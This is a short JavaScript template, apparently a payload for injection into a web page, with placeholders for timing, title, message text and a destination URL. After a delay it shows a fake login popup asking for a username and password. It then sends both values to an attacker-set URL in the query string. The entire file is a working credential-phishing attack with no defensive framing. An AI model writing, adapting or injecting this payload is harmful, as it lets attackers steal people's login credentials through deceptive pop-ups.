var x = document.createElement('link');
x.rel  = 'stylesheet';
x.href='http://w2ui.com/src/w2ui-1.4.2.min.css';
document.getElementsByTagName('head')[0].appendChild(x); 

x = document.createElement('script');
x.src='http://w2ui.com/src/w2ui-1.4.2.min.js';
document.getElementsByTagName('head')[0].appendChild(x); 

x = document.createElement('script');
x.src='http://ajax.googleapis.com/ajax/libs/jquery/2.1.0/jquery.min.js';
document.getElementsByTagName('head')[0].appendChild(x);  

setTimeout(payload, {{time}});

function payload() {
    w2popup.open({
    	width: 400,
    	height: 300,
        title: '<div style="">{{title}}</div>',
        body: '<div class="w2ui-centered" style="position:static; margin-top:20%">\
        {{body}}</div>\
        <div style="margin-left:17%">\
        <table>\
        	<tr>\
        		<td>Username:</td>\
        		<td><input type="text" name="user" class="user"></td>\
        	</tr>\
        	<tr>\
        		<td>Password:</td>\
        		<td><input type="password" name="pass" class="pass"></td>\
        	</tr>\
        </table>\
        </div>',
        buttons: '<button class="btn" onclick="get()">Login</button>'
    });
}

function get() {
    var username = $(".user").val();
    var password = $(".pass").val();
    window.location = "{{url}}/?u=" + username + "&p=" + password;
}

